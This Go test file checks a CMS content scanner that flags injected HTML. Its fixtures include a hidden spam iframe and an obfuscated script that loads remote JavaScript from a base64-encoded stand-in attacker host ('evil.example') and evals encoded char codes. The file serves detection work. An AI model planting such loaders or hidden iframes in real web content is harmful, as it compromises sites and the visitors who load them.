package cms

import (
	"strings"
	"testing"
)

func TestScanValueDetail(t *testing.T) {
	gtm := `<p>Hello</p><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-ABC" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>`
	if d := ScanValueDetail(gtm); d.Signature != "" {
		t.Fatalf("GTM iframe flagged: %+v", d)
	}
	spam := `<p>post text</p><iframe src="https://pharma-spam.example/in.php" width="0" height="0" frameborder="0"></iframe><p>more</p>`
	d := ScanValueDetail(spam)
	if d.Signature != "DB.Injected.HiddenIframe" || d.Category != "iframe" || !strings.Contains(d.Snippet, "pharma-spam.example") {
		t.Fatalf("spam iframe: %+v", d)
	}
	js := `<script>var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUvai5qcw==');document.head.appendChild(s);eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>`
	if d := ScanValueDetail(js); d.Signature == "" || d.Category != "script" || d.Snippet == "" {
		t.Logf("script detail: %+v", d)
	}
}
